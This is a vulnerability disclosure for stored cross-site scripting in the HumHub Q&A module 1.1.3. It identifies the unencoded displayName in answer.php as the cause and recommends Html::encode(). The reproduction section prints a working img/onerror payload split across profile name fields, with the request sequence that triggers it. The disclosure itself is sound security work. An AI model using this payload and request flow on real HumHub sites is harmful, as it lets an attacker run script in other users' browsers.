# HumHub Q&A answer displayName stored XSS

## Summary

HumHub Q&A 1.1.3 contains stored cross-site scripting in answer rendering. The answer view outputs the answer author's displayName inside a strong element without HTML encoding. An authenticated space member can store a crafted profile name and post an answer, causing script execution when another user views the question.

## Affected product

- Vendor/project: **HumHub**
- Product: **Q&A module**
- Affected version: **1.1.3**
- Weakness: **CWE-79**
- CVSS 3.1: `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (5.4)`
- Verification: **STABLE — 3/3 consecutive fresh runs**

## Researcher

- **Zhong Guangyuan, Fudan University**

## Attack prerequisites and impact

Authenticated space member; victim views a question answered by the attacker.

Verified flow: `profile displayName → answer.createdBy.displayName → raw output inside STRONG`

Successful exploitation permits attacker-controlled markup or script to execute in another user's browser in the affected application origin. The exact privilege and interaction requirements are reflected in the CVSS vector above.

## Reproduction

1. Store an HTML marker in the attacker's profile display name.
2. Join a space and post an answer to a question.
3. Open the question as another user and inspect the answer header DOM.

Sanitized request shape used during verification:

```http
# Space member stores markup in own display name
POST <BASE_URL>/user/account/edit
Cookie: <ATTACKER_SESSION_COOKIE>

_csrf=<CSRF>
Profile[firstname]=<img id=gt481023h4d
Profile[lastname]=src=x onerror=self.x=4>
save=Save profile

POST <BASE_URL>/s/<SPACE_ID>/questions/question/create
Question[question]=gt481023h4d question

POST <BASE_URL>/s/<SPACE_ID>/questions/answer/edit?qid=<QUESTION_ID>
QuestionAnswer[answer]=gt481023h4d answer

GET <BASE_URL>/s/<SPACE_ID>/questions/question/view?id=<QUESTION_ID>
```

Authentication values, private host/IP values, internal identifiers, CSRF values, document keys and one-time tokens are redacted. Parameter names, affected endpoints and payload structure are retained.


## Confirmed source and Sink

```text
widgets/views/answer.php:29-38
<div class="questions-answer-header">
    <?= Image::widget([...]) ?>
    <strong><?= $answer->createdBy->displayName ?></strong>
    ...
</div>
```

Root cause: The answer template echoes the author's displayName directly into HTML. No encoder is applied at the output boundary.

## Recommended remediation

Use the framework HTML encoder for displayName, e.g. Html::encode(), before rendering it inside strong.

## References

- Official source: https://github.com/humhub/questions/blob/master/widgets/views/answer.php

## Evidence images

These are screenshots of real browser/tool interfaces captured with Google Chrome on macOS. They are not recreated evidence cards:

1. Chrome's native `view-source:` display of the saved trigger response or browser result, with the observed marker selected.
2. Chrome's native `view-source:` display of an independent response, storage record, or browser-verification artifact.
3. The official upstream GitHub source page with GitHub's native line highlighting on the vulnerable Sink.

The first two screenshots reopen saved verification artifacts; they are not described as live requests. Private deployment addresses, credentials, session values, CSRF values, GUIDs and internal record identifiers are redacted. JSON whitespace was normalized for readability, and unrelated application records were omitted where a response contained other test-session data. The payload, affected field, response status and success booleans were retained.

### Trigger response/result in Chrome

![CAN-17 trigger response in Chrome](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-17/01-trigger-chrome-v3.png)

### Independent verification in Chrome

![CAN-17 independent verification in Chrome](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-17/02-verification-chrome-v3.png)

### Official source and Sink on GitHub

![CAN-17 official source Sink](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-17/03-source-github-v3.png)
